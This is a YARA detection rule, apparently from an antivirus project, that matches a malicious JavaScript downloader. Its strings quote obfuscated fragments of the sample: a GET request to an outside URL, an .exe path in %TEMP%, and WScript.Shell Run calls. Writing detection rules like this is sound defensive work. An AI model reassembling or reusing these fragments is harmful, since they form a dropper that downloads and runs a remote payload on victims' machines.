rule sig_20160328_b4335e57b7711c9fc1949ebb378a06f4 {
  meta:
    description = "datamaliciousorder - file 20160328_b4335e57b7711c9fc1949ebb378a06f4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "65d57f7bda8a924cc10c60b29e65efceb3ca49dd99452e3db2cc288a00fb8370"

  strings:
    $s1  = "function Ozyndq() {return Dqzjuxl[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"IqP8K0blrkNx3Lt.exe\";};" fullword ascii
    $s2  = "do {WScript[Azoabiwtx](Mazjvcn() * 11)} while (Elyzlcp[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Elyzlcp[Wjnmexj](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s4  = "function Oleaxbgd(Ndqpeztaba, Oucsppy){return Ndqpeztaba - Oucsppy;};" fullword ascii
    $s5  = "var Dqzjuxl = function Vviwesepvk() {return WScript[Qsynfpuz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ngdleqgg() {return ((Wwapegzkr == true) && (Wwapegzkr == Krgpla)) ? 1 : Etpena;};" fullword ascii
    $s7  = "function Zaawclfqi(Zpigipg){Dqzjuxl[\"Run\"](Zpigipg, Etpena, Etpena);};" fullword ascii
    $s8  = "function Pigbtfxr(){return Qsynfpuz;};" fullword ascii
    $s9  = "function Rejctikl(){return Wbqlde;};" fullword ascii
    $s10 = "return Oleaxbgd(Tnixzro, Kqpbssbn);" fullword ascii
    $s11 = "var Gkuiogldb = false;" fullword ascii
    $s12 = "var Wwapegzkr = false;" fullword ascii
    $s13 = "function Ahefkn(Iwvwj) {var Ogdthbggxv = (1, 2, 3, 4, 5, Iwvwj); return Ogdthbggxv;};" fullword ascii
    $s14 = "Krgpla = true; " fullword ascii
    $s15 = "var Qsyahrdguc = new this[\"Date\"]();" fullword ascii
    $s16 = " while (Vvwhst){" fullword ascii
    $s17 = "function Ikjcbbbmu()" fullword ascii
    $s18 = "var Krgpla = false;" fullword ascii
    $s19 = "function Mazjvcn(){return 22;};" fullword ascii
    $s20 = "Wwapegzkr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}